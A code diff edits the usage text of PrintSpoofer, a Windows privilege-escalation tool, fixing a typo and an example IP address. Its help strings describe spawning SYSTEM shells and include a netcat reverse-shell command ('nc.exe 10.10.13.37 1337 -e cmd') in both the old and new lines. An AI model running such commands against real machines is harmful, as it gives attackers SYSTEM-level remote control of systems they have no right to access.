@@ -88,7 +88,7 @@ VOID PrintUsage()
 		"  -c <CMD>    Custom command line to execute\n"
 		"  -i          Interact with the new process in the current console (default is non-interactive)\n"
 		"  -d          Spawn a new process on the currently active desktop\n"
-		"  -h          That's me :).\n"
+		"  -h          That's me :)\n"
 		"\n"
 	);
 
@@ -99,7 +99,7 @@ VOID PrintUsage()
 		"  - Spawn a SYSTEM command prompt on the currently active desktop\n"
 		"      PrintSpoofer.exe -d -c cmd.exe\n"
 		"  - Get a SYSTEM reverse shell\n"
-		"      PrintSpoofer.exe -c \"c:\\Temp\\nc.exe 10.10.13.1337 1337 -e cmd\"\n"
+		"      PrintSpoofer.exe -c \"c:\\Temp\\nc.exe 10.10.13.37 1337 -e cmd\"\n"
 		"\n"
 	);
 }
